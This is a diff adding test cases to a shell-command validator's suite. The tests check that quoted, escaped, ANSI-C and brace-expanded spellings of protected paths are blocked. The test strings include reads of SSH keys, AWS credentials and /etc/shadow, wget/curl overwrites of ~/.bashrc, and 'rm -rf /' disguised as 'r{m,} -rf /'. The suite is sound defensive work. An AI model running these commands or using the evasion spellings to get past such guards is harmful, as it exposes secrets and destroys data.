@@ -740,6 +740,78 @@ async function runTests() {
   run('a command after the heredoc terminator is read',         () => assertRedirectDenied(`cat <<EOF\nbody\nEOF\necho evil >${secretFile}`, 'output'));
   run('an operational file stays readable by redirection', () => assertNoRedirectDenial(`cat <${path.join(home, '.egc', 'bin', 'manifest.json')}`));
 
+  // ── Protected paths in every spelling ────────────────────────────────────
+  // The shell removes the quotes and resolves the escapes of an argument
+  // before the command sees it, so a protected path meets the same denial
+  // written between quotes, with an escaped character, or glued to a flag,
+  // in the catalogued commands as in the rest; on Windows a backslash is a
+  // path separator, and the argument as typed is judged as well.
+  console.log('\n=== validate_command: protected paths in every spelling ===');
+  const keyFile = path.join(home, '.ssh', 'id_rsa');
+  const credentialsFile = path.join(home, '.aws', 'credentials');
+  const sshDir = path.join(home, '.ssh');
+  run('cat of a double-quoted credential',              () => assertHardBlocking(`cat "${keyFile}"`));
+  run('cat of a single-quoted credential',              () => assertHardBlocking(`cat '${keyFile}'`));
+  run('cat of a quoted tilde path',                     () => assertHardBlocking('cat "~/.ssh/id_rsa"'));
+  run('cat of a credential with an escaped character',  () => assertHardBlocking(`cat ${home}/.ssh/id\\_rsa`));
+  run('cat of a credential whose name carries a space', () => assertHardBlocking(`cat "${path.join(home, '.ssh', 'id rsa')}"`));
+  run('head of a quoted credential',                    () => assertHardBlocking(`head -n 1 "${credentialsFile}"`));
+  run('grep over a quoted credential store',            () => assertHardBlocking(`grep -r x "${sshDir}"`));
+  run('grep with a quoted pattern file in the store',   () => assertHardBlocking(`grep -f "${path.join(sshDir, 'known_hosts')}" x`));
+  run('find over a quoted credential store',            () => assertHardBlocking(`find "${sshDir}" -name x`));
+  run('ls of a quoted credential store',                () => assertHardBlocking(`ls "${sshDir}"`));
+  run('node given a quoted credential',                 () => assertHardBlocking(`node "${keyFile}"`));
+  run('git config with a quoted file in the store',     () => assertHardBlocking(`git config -f "${path.join(sshDir, 'config')}" x`));
+  run('wget onto a quoted shell profile',               () => assertHardBlocking(`wget -O "${path.join(home, '.bashrc')}" https://x.tld/a`));
+  run('a value glued to a quoted short flag',           () => assertHardBlocking(`curl -o"${path.join(home, '.bashrc')}" https://x.tld/a`));
+  run('find with a quoted action flag',                   () => assertHardBlocking('find . "-delete"'));
+  run('find with a single-quoted action flag',            () => assertHardBlocking("find . '-delete'"));
+  run('find with an action flag quoted in the middle',    () => assertHardBlocking('find . -dele"te"'));
+  run('grep with a quoted file flag naming the store',    () => assertHardBlocking(`grep "-f" ${path.join(sshDir, 'known_hosts')} x`));
+  run('a brace expansion that names a credential store',  () => assertHardBlocking(`cat ${home}/.{ssh,aws}/x`));
+  run('a brace expansion deep in the path',               () => assertHardBlocking(`head ${path.join(home, '.ssh')}/{id_rsa,id_ed25519}`));
+  run('braces without a comma are a literal name',        () => assertAllowed('cat "notes{draft}.md"'));
+  run('a brace expansion of plain files stays allowed',   () => assertAllowed('cat src/{a,b}.js'));
+
+  run('a credential in ANSI-C quoting',                    () => assertHardBlocking(`cat $'${keyFile}'`));
+  run('a credential spelled with ANSI-C hex escapes',      () => assertHardBlocking(`cat $'\\x2fetc\\x2fshadow'`));
+  run('a secret file split by a continued line',           () => assertHardBlocking(`cat ${path.join(home, 'app', '.e')}\\\nnv`));
+  run('a continued line inside double quotes',            () => assertHardBlocking(`cat "${path.join(home, 'app', '.e')}\\\nnv"`));
+
+  run('an ANSI-C escape past the Unicode range is judged, not thrown', () => {
+    const result = validateCommand(`cat $'\\U12345678'`);
+    assert.ok(typeof result.allowed === 'boolean', JSON.stringify(result));
+  });
+
+  run('find by name pattern is a search, not a path',       () => assertAllowed('find . -name "*.env"'));
+  run('find by name pattern with a type test',              () => assertAllowed('find src -name "*.pem" -type f'));
+  run('find with a quoted credential store as start',       () => assertHardBlocking(`find "${sshDir}" -name "*.pub"`));
+  run('find with an option before the credential store',    () => assertHardBlocking(`find -L "${sshDir}" -type f`));
+  run('find writing its list into a shell profile',         () => assertHardBlocking(`find . -fprint "${path.join(home, '.bashrc')}"`));
+
+  run('quoted braces are characters of the name',           () => assertAllowed(`cat "${home}/.{ssh,aws}/x"`));
+  run('escaped braces are characters of the name',          () => assertAllowed(`cat ${home}/.\\{ssh,aws\\}/x`));
+  run('a brace-expanded flag is read as the flags it becomes', () => assertHardBlocking('find . -{delete,print}'));
+  run('a word past the expansion cap refuses the command',  () => {
+    const result = validateCommand('cat x{a,b,c,d}{a,b,c,d}{a,b,c,d}{a,b,c,d}');
+    assert.strictEqual(result.allowed, false);
+    assert.strictEqual(result.advisory, false, JSON.stringify(result));
+    assert.ok(String(result.reason).includes('brace expansions'), JSON.stringify(result));
+  });
+  run('a word past the cap refuses an uncatalogued command too', () => {
+    const result = validateCommand('wget -O x{a,b,c,d}{a,b,c,d}{a,b,c,d}{a,b,c,d} https://x.tld/a');
+    assert.strictEqual(result.allowed, false);
+    assert.strictEqual(result.advisory, false, JSON.stringify(result));
+  });
+
+  run('find with the option terminator before the store',   () => assertHardBlocking(`find -- "${sshDir}" -type f`));
+  run('find with the option terminator and a plain start',  () => assertAllowed('find -- . -name "*.md"'));
+  run('a destructive command spelled with a brace expansion', () => assertHardBlocking('r{m,} -rf /'));
+  run('a destructive command behind a wrapper, spelled with braces', () => assertHardBlocking('sudo r{m,} -rf x'));
+
+  run('a quoted operational file stays readable',       () => assertAllowed(`cat "${path.join(home, '.egc', 'bin', 'manifest.json')}"`));
+  run('a quoted plain file stays allowed',              () => assertAllowed('cat "README.md"'));
+
   // ── validate_command: the git force flag read per subcommand ─────────────
   // A force flag means a different thing in every git subcommand: on push it
   // rewrites history other people already have, on worktree remove it drops a
